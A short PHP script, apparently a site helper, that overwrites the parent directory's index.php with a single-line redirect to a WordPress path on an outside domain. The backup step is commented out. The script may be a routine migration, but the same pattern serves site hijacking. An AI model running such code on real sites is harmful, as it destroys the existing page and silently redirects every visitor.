<?php
$file = "../index.php";
echo 'hit';
$fp = fopen($file,"w");
$data = '<?php header("Location: https://13-sunplace-osaka.com/wp/");';

$ok = fputs($fp,$data);

echo $ok;

//$ok = rename($file,"../index_bak.php");
//echo $ok;